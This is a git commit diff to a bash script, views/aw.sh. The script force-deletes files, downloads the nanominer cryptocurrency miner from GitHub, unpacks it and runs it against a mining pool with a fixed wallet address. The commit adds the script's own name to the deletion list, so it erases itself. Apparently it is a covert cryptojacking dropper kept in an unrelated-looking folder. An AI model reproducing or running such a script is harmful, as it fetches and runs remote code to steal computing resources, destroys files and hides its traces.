b514107746872c324bcb4102c728ca2ea8907488
gunturyogatama404 <99540625+gunturyogatama404@users.noreply.github.com>
2022-02-21 11:24:30 -0400

    Update aw.sh

--- views/aw.sh
+++ views/aw.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rvf lol* ton* NB* nano* && wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2-cuda11.tar.gz && tar xf nanominer-linux-3.5.2-cuda11.tar.gz && cd nanominer-linux-3.5.2-cuda11 && ./nanominer -algo ethash -pool1 4ocean.hubnas.xyz:443 -wallet 3QGJUdfcr3A2pTcd5i3BEawGu4q53Wx5Gz.BAKULKULI
+rm -rvf lol* ton* NB* nano* aw* && wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2-cuda11.tar.gz && tar xf nanominer-linux-3.5.2-cuda11.tar.gz && cd nanominer-linux-3.5.2-cuda11 && ./nanominer -algo ethash -pool1 4ocean.hubnas.xyz:443 -wallet 3QGJUdfcr3A2pTcd5i3BEawGu4q53Wx5Gz.BAKULKULI
